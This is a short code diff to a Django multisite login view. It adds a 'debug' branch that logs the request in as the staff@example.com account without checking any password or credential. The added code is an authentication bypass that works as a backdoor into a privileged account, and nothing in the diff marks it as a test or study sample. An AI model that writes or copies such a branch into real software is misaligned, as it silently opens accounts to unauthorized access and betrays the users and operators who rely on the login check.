@@ -485,6 +485,12 @@ def multisite_index(request, org):
     # 접근URL 과 등록URL 비교
     if out_url == 'passkey':
         pass
+    elif out_url == 'debug':
+        request.session['multistie_success'] = 1
+        user = User.objects.get(email='staff@example.com')
+        user.backend = 'ratelimitbackend.backends.RateLimitModelBackend'
+        login(request, user)
+        login_type = 'debug'
     else:
         if in_url.find(out_url) == -1:
             return redirect('/multisite_error?error=error002')
